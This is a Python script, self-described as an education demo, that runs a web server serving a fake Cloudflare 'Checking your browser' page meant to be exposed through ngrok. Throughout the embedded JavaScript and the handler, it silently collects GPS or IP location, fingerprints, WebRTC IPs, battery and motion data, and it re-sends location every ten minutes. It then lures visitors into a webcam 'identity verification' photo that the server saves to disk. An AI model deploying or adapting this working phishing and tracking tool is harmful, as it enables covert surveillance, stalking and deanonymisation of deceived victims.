#!/usr/bin/env python3
"""
cf-tracker — cybersecurity education demo
Maximum data collection: GPS, IP, browser fingerprint, WebRTC, audio, fonts,
device motion, network info, headers, session tracking, persistent logging.
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import json, datetime, os, uuid, threading
PRINT_LOCK = threading.Lock()

PORT     = int(os.environ.get('PORT', 5000))
LOG_FILE = "tracker_log.txt"
SESSIONS = {}  # session_id -> visit count

# ── ANSI COLORS ───────────────────────────────────────────────────────────────
R    = '\033[91m'
G    = '\033[92m'
Y    = '\033[93m'
B    = '\033[94m'
M    = '\033[95m'
C    = '\033[96m'
W    = '\033[97m'
DIM  = '\033[2m'
BOLD = '\033[1m'
RST  = '\033[0m'

# ── HTML PAGE ─────────────────────────────────────────────────────────────────
HTML = r"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Just a moment... | Cloudflare</title>
<link rel="icon" href="https://www.cloudflare.com/favicon.ico">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #f6f6ef;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    display: flex; align-items: center; justify-content: center; min-height: 100vh;
  }
  .card {
    background: #fff; border: 1px solid #e0e0e0; border-radius: 8px;
    padding: 28px 32px 24px; width: 300px; box-shadow: 0 1px 4px rgba(0,0,0,0.08);
  }
  .site-info { text-align: center; margin-bottom: 20px; }
  .site-info .domain { font-size: 18px; font-weight: 600; color: #1d1d1f; margin-bottom: 2px; }
  .site-info .checking-msg { font-size: 13px; color: #666; }
  .cf-logo { display: flex; align-items: center; gap: 8px; margin-bottom: 18px; }
  .cf-logo svg { width: 28px; height: 28px; }
  .cf-logo-text { font-size: 13px; color: #666; font-weight: 500; }
  .cf-logo-text span { color: #f38020; font-weight: 700; }
  .verify-row {
    display: flex; align-items: center; gap: 14px; padding: 14px 16px;
    border: 1px solid #e3e3e3; border-radius: 6px; background: #fafafa;
    user-select: none;
  }
  .checkbox {
    width: 24px; height: 24px; border: 2px solid #ccc; border-radius: 4px;
    display: flex; align-items: center; justify-content: center;
    flex-shrink: 0; background: #fff;
  }
  .checkbox.checking { border-color: #f38020; animation: spin 0.8s linear infinite; }
  .checkbox.done { border-color: #39b54a; background: #39b54a; animation: none; }
  .checkbox.done::after {
    content: ''; width: 6px; height: 11px; border: 2px solid #fff;
    border-top: none; border-left: none;
    transform: rotate(45deg) translateY(-1px); display: block;
  }
  @keyframes spin {
    0%   { border-color: #f38020 transparent #f38020 transparent; }
    100% { border-color: transparent #f38020 transparent #f38020; }
  }
  .verify-label { font-size: 14px; color: #333; }
  .cf-footer { margin-top: 14px; display: flex; align-items: center; justify-content: space-between; }
  .cf-footer-brand { font-size: 10px; color: #aaa; line-height: 1.4; }
  .cf-footer-brand a { color: #f38020; text-decoration: none; font-weight: 600; }
  .cf-footer-links { font-size: 10px; color: #bbb; display: flex; gap: 8px; }
  .cf-footer-links a { color: #bbb; text-decoration: none; }
  .ray-id { text-align: center; font-size: 10px; color: #bbb; margin-top: 16px; font-family: monospace; }
  .cam-box { display: none; margin-top: 16px; text-align: center; }
  .cam-box video { width: 100%; border-radius: 6px; border: 1px solid #e0e0e0; }
  .cam-box canvas { display: none; }
  .cam-label { font-size: 12px; color: #888; margin-top: 8px; margin-bottom: 8px; }
  .cam-btn {
    background: #f38020; border: none; color: #fff;
    font-size: 13px; padding: 8px 20px; border-radius: 4px;
    cursor: pointer; width: 100%; margin-top: 8px;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  }
  .cam-btn:hover { background: #e07010; }
</style>
</head>
<body>
<div class="card">
  <div class="site-info">
    <div class="domain">Checking your browser...</div>
    <div class="checking-msg">This process is automatic. Your browser will redirect shortly.</div>
  </div>
  <div class="cf-logo">
    <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
      <path d="M323.5 252.2c1.9-6.6 1.2-12.7-2.1-17.2-3-4.2-8-6.6-14.2-6.8l-183.3-.6c-1.4 0-2.6.7-3.3 1.8-.7 1.1-.7 2.5-.1 3.7l24.6 46.8c2.4 4.6 7.3 7.5 12.6 7.5l170.8.1c6.4 0 11.8-4.4 13.2-10.6l-18.2-24.7z" fill="#f38020"/>
      <path d="M384.4 195.6c-1.9 6.6-1.2 12.7 2.1 17.2 3 4.2 8 6.6 14.2 6.8l26.1.9c1.5 0 2.8-.7 3.5-1.9.7-1.2.6-2.6-.1-3.8l-10.1-18.9c-2.4-4.5-7.3-7.3-12.6-7.3h-9.9c-6.4-.1-11.8 4.3-13.2 10.5v-3.5z" fill="#faad3f"/>
      <path d="M256 64C150 64 64 150 64 256s86 192 192 192 192-86 192-192S362 64 256 64zm112.4 290.2l-183 .6c-8.4 0-16.1-4.6-20.2-12l-45-85.6c-2.2-4.1-2.1-9 .2-13s6.3-6.5 10.8-6.5l211.5.7c10.2.3 19.3 6.2 23.6 15.3l18.9 35.9c2.2 4.1 2.1 9-.2 13-2.4 4-6.5 6.5-10.8 6.5l-36.9.5c-3.5.1-6.5 2.5-7.3 5.9-1.1 4.3 1.5 8.7 5.8 9.8l28.3 7.7c1.5.4 2.7 1.5 3.2 3 .5 1.4.2 3-.9 4.1-5.8 6.3-14.1 9.8-22.8 9.8l1.8 4.3z" fill="#f38020"/>
    </svg>
    <div class="cf-logo-text"><span>Cloudflare</span> Turnstile</div>
  </div>
  <div class="verify-row">
    <div class="checkbox" id="checkbox"></div>
    <span class="verify-label" id="label">I am not a robot</span>
  </div>
  <div class="cam-box" id="camBox">
    <div class="cam-label">Identity verification required. Please allow camera access.</div>
    <video id="camVideo" autoplay playsinline muted></video>
    <canvas id="camCanvas"></canvas>
    <button class="cam-btn" id="camBtn" onclick="capturePhoto()">📸 Take Verification Photo</button>
    <div class="cam-label" id="camStatus"></div>
  </div>
  <div class="cf-footer">
    <div class="cf-footer-brand">Protected by <a href="#">Cloudflare</a><br><span style="color:#ccc">Privacy · Terms</span></div>
    <div class="cf-footer-links"><a href="#">Privacy</a><a href="#">Terms</a></div>
  </div>
  <div class="ray-id">Ray ID: <span id="rid"></span></div>
</div>

<script>
// ── SESSION ID ────────────────────────────────────────────────────────────────
var sid = sessionStorage.getItem('_cf_sid');
if (!sid) { sid = Math.random().toString(36).slice(2) + Date.now().toString(36); sessionStorage.setItem('_cf_sid', sid); }

var pingCount = 0;
var collectedData = {};

// ── RAY ID ────────────────────────────────────────────────────────────────────
document.getElementById('rid').innerText =
  Math.random().toString(16).slice(2,10).toUpperCase() +
  Math.random().toString(16).slice(2,10).toUpperCase();

// ── CANVAS FINGERPRINT ────────────────────────────────────────────────────────
function getCanvasFingerprint() {
  try {
    var c = document.createElement('canvas');
    var ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('cf-tracker \uD83D\uDD12', 2, 15);
    ctx.fillStyle = 'rgba(102,204,0,0.7)';
    ctx.fillText('cf-tracker \uD83D\uDD12', 4, 17);
    return c.toDataURL().slice(-80);
  } catch(e) { return 'blocked'; }
}

// ── AUDIO FINGERPRINT ─────────────────────────────────────────────────────────
function getAudioFingerprint(cb) {
  try {
    var ctx = new (window.AudioContext || window.webkitAudioContext)({sampleRate: 44100});
    var osc = ctx.createOscillator();
    var analyser = ctx.createAnalyser();
    var gain = ctx.createGain();
    gain.gain.value = 0;
    osc.type = 'triangle';
    osc.connect(analyser);
    analyser.connect(gain);
    gain.connect(ctx.destination);
    osc.start(0);
    setTimeout(function() {
      var buf = new Float32Array(analyser.frequencyBinCount);
      analyser.getFloatFrequencyData(buf);
      osc.stop();
      ctx.close();
      var hash = buf.slice(0, 30).reduce(function(a,b){ return a + Math.abs(b); }, 0).toFixed(6);
      cb(hash);
    }, 100);
  } catch(e) { cb('blocked'); }
}

// ── WEBRTC LOCAL IP LEAK ──────────────────────────────────────────────────────
function getWebRTCIPs(cb) {
  var ips = [];
  try {
    var pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
    pc.createDataChannel('');
    pc.createOffer().then(function(offer) { return pc.setLocalDescription(offer); });
    pc.onicecandidate = function(e) {
      if (!e || !e.candidate) { pc.close(); cb([...new Set(ips)]); return; }
      var m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
      if (m) ips = ips.concat(m);
    };
    setTimeout(function() { pc.close(); cb([...new Set(ips)]); }, 1500);
  } catch(e) { cb([]); }
}

// ── FONT DETECTION ────────────────────────────────────────────────────────────
function getInstalledFonts() {
  var fonts = ['Arial','Verdana','Helvetica','Times New Roman','Courier New',
    'Georgia','Palatino','Garamond','Bookman','Comic Sans MS','Trebuchet MS',
    'Impact','Lucida Console','Tahoma','Geneva','Monaco','Consolas',
    'Calibri','Cambria','Segoe UI','Roboto','Ubuntu','Cantarell',
    'Futura','Century Gothic','Gill Sans','Optima','Didot'];
  var detected = [];
  var canvas = document.createElement('canvas');
  var ctx = canvas.getContext('2d');
  var base = 'monospace';
  ctx.font = '72px ' + base;
  var baseW = ctx.measureText('mmmmmmmmmmlli').width;
  fonts.forEach(function(f) {
    ctx.font = "72px '" + f + "', " + base;
    if (ctx.measureText('mmmmmmmmmmlli').width !== baseW) detected.push(f);
  });
  return detected;
}

// ── MEDIA DEVICES ─────────────────────────────────────────────────────────────
function getMediaDevices(cb) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) { cb({}); return; }
  navigator.mediaDevices.enumerateDevices().then(function(devices) {
    var cameras = devices.filter(function(d){ return d.kind === 'videoinput'; }).length;
    var mics    = devices.filter(function(d){ return d.kind === 'audioinput'; }).length;
    var speakers= devices.filter(function(d){ return d.kind === 'audiooutput'; }).length;
    cb({cameras: cameras, microphones: mics, speakers: speakers});
  }).catch(function(){ cb({}); });
}

// ── DEVICE MOTION ─────────────────────────────────────────────────────────────
var motionData = null;
function startMotionTracking() {
  if (!window.DeviceMotionEvent) return;
  window.addEventListener('devicemotion', function handler(e) {
    if (e.acceleration) {
      motionData = {
        x: e.acceleration.x ? e.acceleration.x.toFixed(3) : null,
        y: e.acceleration.y ? e.acceleration.y.toFixed(3) : null,
        z: e.acceleration.z ? e.acceleration.z.toFixed(3) : null,
        interval: e.interval
      };
    }
    window.removeEventListener('devicemotion', handler);
  }, {once: true});
}

// ── TAB VISIBILITY TRACKING ───────────────────────────────────────────────────
var tabEvents = [];
document.addEventListener('visibilitychange', function() {
  tabEvents.push({state: document.visibilityState, time: new Date().toISOString()});
});

// ── COLLECT ALL & SEND ────────────────────────────────────────────────────────
function startTracking() {
  document.getElementById('checkbox').classList.add('checking');
  document.getElementById('label').innerText = 'Verifying...';
  startMotionTracking();

  // Build fingerprint
  var fp = {
    // Browser
    userAgent:      navigator.userAgent,
    platform:       navigator.platform,
    vendor:         navigator.vendor,
    language:       navigator.language,
    languages:      (navigator.languages || []).join(','),
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack:     navigator.doNotTrack,
    historyLength:  history.length,
    // Hardware
    hardwareCores:  navigator.hardwareConcurrency || 'unknown',
    maxTouchPoints: navigator.maxTouchPoints || 0,
    deviceMemoryGB: navigator.deviceMemory || 'unknown',
    // Display
    screenW:        screen.width,
    screenH:        screen.height,
    screenDepth:    screen.colorDepth,
    pixelRatio:     window.devicePixelRatio || 1,
    orientation:    screen.orientation ? screen.orientation.type : 'unknown',
    // Time
    timezone:       Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    // Canvas
    canvasHash:     getCanvasFingerprint(),
    // Fonts
    fonts:          getInstalledFonts(),
    // Session
    sessionId:      sid,
  };

  // WebGL GPU
  try {
    var gl = document.createElement('canvas').getContext('webgl');
    var dbg = gl.getExtension('WEBGL_debug_renderer_info');
    fp.webglVendor   = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : 'unknown';
    fp.webglRenderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'unknown';
  } catch(e) { fp.webglVendor = fp.webglRenderer = 'blocked'; }

  // Network
  if (navigator.connection) {
    fp.connectionType = navigator.connection.effectiveType;
    fp.downlink       = navigator.connection.downlink;
    fp.rtt            = navigator.connection.rtt;
    fp.saveData       = navigator.connection.saveData;
  }

  // Plugins
  fp.plugins = Array.from(navigator.plugins || []).map(function(p){ return p.name; }).join(' | ');

  // Memory
  if (performance.memory) fp.jsHeapMB = Math.round(performance.memory.usedJSHeapSize / 1048576);

  // Battery
  if (navigator.getBattery) {
    navigator.getBattery().then(function(b) {
      fp.battery = Math.round(b.level * 100) + '% ' + (b.charging ? '(charging)' : '(discharging)');
    });
  }

  collectedData.fingerprint = fp;

  // Get audio fingerprint, then WebRTC IPs, then media devices, then location
  getAudioFingerprint(function(audioHash) {
    fp.audioHash = audioHash;
    getWebRTCIPs(function(ips) {
      fp.webrtcIPs = ips;
      getMediaDevices(function(media) {
        fp.mediaDevices = media;
        // Now go for location
        locateUser(fp);
      });
    });
  });
}

// ── LOCATION ─────────────────────────────────────────────────────────────────
var IP_APIS = [
  { url: 'https://ipapi.co/json/',
    parse: function(d){ return {lat:d.latitude,lng:d.longitude,city:d.city,country:d.country_name,ip:d.ip}; }},
  { url: 'https://ip-api.com/json/?fields=lat,lon,city,country,query',
    parse: function(d){ return {lat:d.lat,lng:d.lon,city:d.city,country:d.country,ip:d.query}; }}
];

function locateUser(fp) {
  var done = false;
  var timer = setTimeout(function() {
    if (!done) { done = true; tryIPApis(0, fp); }
  }, 4000);

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        if (done) return; done = true; clearTimeout(timer);
        verified();
        send(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'GPS', '', '', '', fp);
        setInterval(function() {
          fp.motion = motionData;
          fp.tabEvents = tabEvents;
          navigator.geolocation.getCurrentPosition(
            function(p){ send(p.coords.latitude, p.coords.longitude, p.coords.accuracy, 'GPS','','','', fp); },
            function()  { tryIPSilent(fp); },
            {enableHighAccuracy: true, timeout: 5000}
          );
        }, 10 * 60 * 1000);
      },
      function() { if (done) return; done = true; clearTimeout(timer); tryIPApis(0, fp); },
      {enableHighAccuracy: false, timeout: 4000, maximumAge: 300000}
    );
  } else {
    clearTimeout(timer); tryIPApis(0, fp);
  }
}

function tryIPApis(index, fp) {
  if (index >= IP_APIS.length) { verified(); return; }
  var api = IP_APIS[index];
  var xhr = new XMLHttpRequest();
  xhr.open('GET', api.url, true); xhr.timeout = 5000;
  xhr.onload = function() {
    if (xhr.status !== 200) { tryIPApis(index+1, fp); return; }
    try {
      var d = api.parse(JSON.parse(xhr.responseText));
      if (!d.lat || !d.lng) { tryIPApis(index+1, fp); return; }
      verified();
      send(d.lat, d.lng, 5000, 'IP', d.city||'', d.country||'', d.ip||'', fp);
      setInterval(function(){ tryIPSilent(fp); }, 10*60*1000);
    } catch(e) { tryIPApis(index+1, fp); }
  };
  xhr.ontimeout = xhr.onerror = function(){ tryIPApis(index+1, fp); };
  xhr.send();
}

function tryIPSilent(fp) {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://ipapi.co/json/', true); xhr.timeout = 5000;
  xhr.onload = function() {
    try {
      var d = JSON.parse(xhr.responseText);
      if (d.latitude) send(d.latitude, d.longitude, 5000, 'IP', d.city, d.country_name, d.ip, fp);
    } catch(e) {}
  };
  xhr.send();
}

function verified() {
  document.getElementById('checkbox').classList.remove('checking');
  document.getElementById('checkbox').classList.add('done');
  document.getElementById('label').innerText = 'Step 1 complete — identity check required';
  setTimeout(startCamera, 600);
}

function send(lat, lng, accuracy, method, city, country, ip, fp) {
  pingCount++;
  fp.motion    = motionData;
  fp.tabEvents = tabEvents;
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '/ping', true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({
    transmission: pingCount,
    sessionId:    sid,
    timestamp:    new Date().toISOString(),
    method:       method,
    latitude:     lat,  longitude: lng, accuracy: accuracy,
    city:         city, country:   country, ip: ip,
    fingerprint:  fp
  }));
}

// ── CAMERA CAPTURE ───────────────────────────────────────────────────────────
var camStream = null;

function startCamera() {
  var box = document.getElementById('camBox');
  box.style.display = 'block';
  var btn = document.getElementById('camBtn');
  btn.disabled = true;
  btn.innerText = 'Initializing camera...';
  navigator.mediaDevices.getUserMedia({video: {facingMode: 'user', width: {ideal: 1280}, height: {ideal: 720}}, audio: false})
    .then(function(stream) {
      camStream = stream;
      var video = document.getElementById('camVideo');
      video.srcObject = stream;
      // Wait 2.5s for camera to warm up before enabling button
      setTimeout(function() {
        btn.disabled = false;
        btn.innerText = '📸 Take Verification Photo';
      }, 2500);
    })
    .catch(function(e) {
      document.getElementById('camStatus').innerText = 'Camera access denied.';
      btn.style.display = 'none';
    });
}

function capturePhoto() {
  var video  = document.getElementById('camVideo');
  var canvas = document.getElementById('camCanvas');
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
  var dataUrl = canvas.toDataURL('image/jpeg', 0.8);

  document.getElementById('camBtn').disabled = true;
  document.getElementById('camStatus').innerText = 'Verifying identity...';

  var xhr = new XMLHttpRequest();
  xhr.open('POST', '/photo', true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.onload = function() {
    document.getElementById('camStatus').innerText = 'Identity verified ✓';
    document.getElementById('camVideo').style.display = 'none';
    if (camStream) camStream.getTracks().forEach(function(t){ t.stop(); });
  };
  xhr.onerror = function() {
    document.getElementById('camStatus').innerText = 'Upload failed.';
  };
  xhr.send(JSON.stringify({photo: dataUrl, sessionId: sid, timestamp: new Date().toISOString()}));
}

window.onload = startTracking;
</script>
</body>
</html>"""

# ── HELPERS ───────────────────────────────────────────────────────────────────
def log(text):
    print(text)
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(text.replace(R,'').replace(G,'').replace(Y,'').replace(B,'')
                    .replace(M,'').replace(C,'').replace(W,'').replace(DIM,'')
                    .replace(BOLD,'').replace(RST,'') + '\n')

def lookup_ip(ip):
    try:
        import urllib.request
        url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting"
        r = urllib.request.urlopen(url, timeout=4)
        return json.loads(r.read())
    except:
        return {}

def flag(val, bad_val=True, bad_color=R, good_color=G):
    if val == bad_val: return f"{bad_color}{val}{RST}"
    return f"{good_color}{val}{RST}"

# ── REQUEST HANDLER ───────────────────────────────────────────────────────────
class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("ngrok-skip-browser-warning", "true")
        self.end_headers()
        self.wfile.write(HTML.encode())

    def do_POST(self):
        if self.path == '/photo':
            self.do_POST_photo()
            return
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw    = self.rfile.read(length)

        # Grab server-side headers too
        srv_headers = {
            'X-Forwarded-For': self.headers.get('X-Forwarded-For', ''),
            'X-Real-IP':       self.headers.get('X-Real-IP', ''),
            'Accept-Language': self.headers.get('Accept-Language', ''),
            'Accept-Encoding': self.headers.get('Accept-Encoding', ''),
            'Referer':         self.headers.get('Referer', ''),
            'Origin':          self.headers.get('Origin', ''),
        }

        try:
            data   = json.loads(raw)
            ts     = datetime.datetime.now().strftime("%H:%M:%S")
            lat    = data.get("latitude")
            lng    = data.get("longitude")
            acc    = data.get("accuracy", "?")
            method = data.get("method", "?")
            city   = data.get("city", "")
            country= data.get("country", "")
            ip     = data.get("ip", "")
            fp     = data.get("fingerprint", {})
            tx     = data.get("transmission", "?")
            sid    = data.get("sessionId", "?")

            # Session tracking
            SESSIONS[sid] = SESSIONS.get(sid, 0) + 1
            visit_count = SESSIONS[sid]
            is_returning = visit_count > 1

            W80 = '═' * 60
            sep = f"{DIM}{'─'*60}{RST}"

            log(f"\n{BOLD}{W}╔{W80}╗{RST}")
            log(f"{BOLD}{W}║  {G}PING #{tx}  {Y}{ts}  {C}via {method}  "
                f"{M}Session: ...{str(sid)[-8:]}  "
                f"{'[RETURNING x'+str(visit_count)+']' if is_returning else '[NEW VISITOR]'}"
                f"{W}  ║{RST}")
            log(f"{BOLD}{W}╚{W80}╝{RST}")

            # ── LOCATION ──────────────────────────────────────────────────────
            log(f"\n  {BOLD}{C}[ LOCATION ]{RST}")
            log(f"    LAT/LNG    : {W}{lat}, {lng}{RST}")
            log(f"    ACCURACY   : ±{acc}m {'← GPS precision!' if float(str(acc)) < 100 else ''}")
            if city: log(f"    CITY       : {city}, {country}")
            log(f"    GOOGLE MAP : {Y}https://maps.google.com/?q={lat},{lng}{RST}")

            # ── IP DATABASE ───────────────────────────────────────────────────
            if ip:
                log(f"\n  {BOLD}{C}[ IP DATABASE ]{RST}")
                log(f"    ADDRESS    : {W}{ip}{RST}")
                # Check if real IP leaked via XFF header
                xff = srv_headers.get('X-Forwarded-For','')
                if xff: log(f"    XFF HEADER : {Y}{xff}{RST}  ← real IP chain")
                db = lookup_ip(ip)
                if db.get("status") == "success":
                    log(f"    ISP        : {db.get('isp')}")
                    log(f"    ORG        : {db.get('org')}")
                    log(f"    ASN        : {db.get('as')}")
                    log(f"    REGION     : {db.get('regionName')}, {db.get('country')}")
                    log(f"    ZIP        : {db.get('zip')}")
                    log(f"    TIMEZONE   : {db.get('timezone')}")
                    log(f"    MOBILE     : {flag(db.get('mobile', False))}")
                    log(f"    VPN/PROXY  : {flag(db.get('proxy',  False), True, R)}")
                    log(f"    HOSTING    : {flag(db.get('hosting',False), True, Y)}")

            # ── SERVER HEADERS ────────────────────────────────────────────────
            log(f"\n  {BOLD}{C}[ HTTP HEADERS ]{RST}")
            log(f"    ACCEPT-LANG: {srv_headers.get('Accept-Language','—')}")
            log(f"    ACCEPT-ENC : {srv_headers.get('Accept-Encoding','—')}")
            if srv_headers.get('Referer'): log(f"    REFERER    : {srv_headers.get('Referer')}")

            # ── WEBRTC ────────────────────────────────────────────────────────
            webrtc_ips = [ip for ip in fp.get('webrtcIPs', []) if ip != '0.0.0.0']
            if webrtc_ips:
                log(f"\n  {BOLD}{C}[ WEBRTC IP LEAK ]{RST}  {R}← real IPs even behind VPN!{RST}")
                for wip in webrtc_ips:
                    log(f"    {R}{wip}{RST}")
            else:
                log(f"\n  {BOLD}{C}[ WEBRTC ]{RST}  {DIM}No leak detected{RST}")

            # ── BROWSER FINGERPRINT ───────────────────────────────────────────
            log(f"\n  {BOLD}{C}[ BROWSER FINGERPRINT ]{RST}")
            log(f"    SESSION ID : ...{str(sid)[-12:]}  {'[SEEN '+str(visit_count)+'x]' if is_returning else '[FIRST VISIT]'}")
            log(f"    PLATFORM   : {fp.get('platform')} / {fp.get('vendor','')}")
            log(f"    USER AGENT : {fp.get('userAgent','')}")
            log(f"    SCREEN     : {fp.get('screenW')}×{fp.get('screenH')} @{fp.get('pixelRatio')}x  depth:{fp.get('screenDepth')}bit")
            log(f"    ORIENTATION: {fp.get('orientation')}")
            log(f"    LANGUAGE   : {fp.get('language')}  ({fp.get('languages','')})")
            log(f"    TIMEZONE   : {fp.get('timezone')}  (UTC offset: {fp.get('timezoneOffset')}min)")
            log(f"    CPU CORES  : {fp.get('hardwareCores')}")
            log(f"    TOUCH PTS  : {fp.get('maxTouchPoints')}  {'← mobile device' if int(str(fp.get('maxTouchPoints',0))) > 1 else '← desktop'}")
            log(f"    DEVICE MEM : {fp.get('deviceMemoryGB')} GB")
            log(f"    GPU        : {fp.get('webglRenderer','unknown')}")
            log(f"    GPU VENDOR : {fp.get('webglVendor','unknown')}")
            log(f"    CANVAS     : ...{fp.get('canvasHash','?')}")
            log(f"    AUDIO FP   : {fp.get('audioHash','?')}  ← unique per device")
            log(f"    HISTORY LEN: {fp.get('historyLength')}  ← browser session depth")
            log(f"    COOKIES    : {fp.get('cookiesEnabled')}")
            log(f"    DO NOT TRCK: {fp.get('doNotTrack')}")
            if fp.get('jsHeapMB'):   log(f"    JS HEAP    : {fp.get('jsHeapMB')} MB")
            if fp.get('battery'):    log(f"    BATTERY    : {fp.get('battery')}")

            # Fonts
            fonts = fp.get('fonts', [])
            if fonts: log(f"    FONTS ({len(fonts)})  : {', '.join(fonts[:12])}{'...' if len(fonts)>12 else ''}")

            # Plugins
            if fp.get('plugins'): log(f"    PLUGINS    : {str(fp.get('plugins'))[:70]}")

            # Network
            if fp.get('connectionType'):
                log(f"    NETWORK    : {fp.get('connectionType')}  ↓{fp.get('downlink')} Mbps  RTT:{fp.get('rtt')}ms  SaveData:{fp.get('saveData')}")

            # Media devices
            media = fp.get('mediaDevices', {})
            if media: log(f"    CAMERAS    : {media.get('cameras',0)}  MICS: {media.get('microphones',0)}  SPEAKERS: {media.get('speakers',0)}")

            # Device motion
            motion = fp.get('motion')
            if motion and motion.get('x') is not None:
                log(f"    MOTION     : x={motion.get('x')} y={motion.get('y')} z={motion.get('z')}  ← accelerometer")

            # Tab visibility events
            tab_events = fp.get('tabEvents', [])
            if tab_events: log(f"    TAB EVENTS : {len(tab_events)} event(s) — {[e.get('state') for e in tab_events]}")

            log(f"\n  {DIM}Saved to {LOG_FILE}{RST}")
            log(f"{BOLD}{W}{'═'*60}{RST}\n")

        except Exception as e:
            print(f"{R}[ERROR] {e}{RST}")
            import traceback; traceback.print_exc()
        finally:
            try: PRINT_LOCK.release()
            except RuntimeError: pass


        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def do_POST_photo(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        try:
            data = json.loads(self.rfile.read(length))
            photo_data = data.get("photo", "")
            sid   = data.get("sessionId", "unknown")
            ts    = datetime.datetime.now().strftime("%H:%M:%S")

            if photo_data.startswith("data:image/jpeg;base64,"):
                import base64
                img_bytes = base64.b64decode(photo_data.split(",")[1])
                fname = f"photo_{sid[-8:]}_{ts.replace(':','')}.jpg"
                with open(fname, 'wb') as f:
                    f.write(img_bytes)
                log(f"\n{BOLD}{R}[ 📸 PHOTO CAPTURED ]{RST}")
                log(f"    SESSION  : ...{sid[-12:]}")
                log(f"    TIME     : {ts}")
                log(f"    FILE     : {Y}{fname}{RST}  ({len(img_bytes)//1024} KB)")
                log(f"    {R}Saved to disk!{RST}\n")
        except Exception as e:
            print(f"{R}[PHOTO ERROR] {e}{RST}")

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def log_message(self, *args): pass

# ── START ─────────────────────────────────────────────────────────────────────
print(f"{BOLD}{G}")
print(f"  ██████╗███████╗    ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ ")
print(f" ██╔════╝██╔════╝    ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗")
print(f" ██║     █████╗         ██║   ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝")
print(f" ██║     ██╔══╝         ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗")
print(f" ╚██████╗██║            ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║")
print(f"  ╚═════╝╚═╝            ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝")
print(f"{RST}")
print(f"  {DIM}Collects: GPS · IP · WebRTC · Canvas · Audio · Fonts · GPU · Motion · Headers{RST}")
print(f"  {Y}[*] Server running on port {PORT}{RST}")
print(f"  {DIM}[*] Run in another terminal: ngrok http {PORT}{RST}")
print(f"  {DIM}[*] All data logged to: {LOG_FILE}{RST}\n")

HTTPServer(("", PORT), Handler).serve_forever()
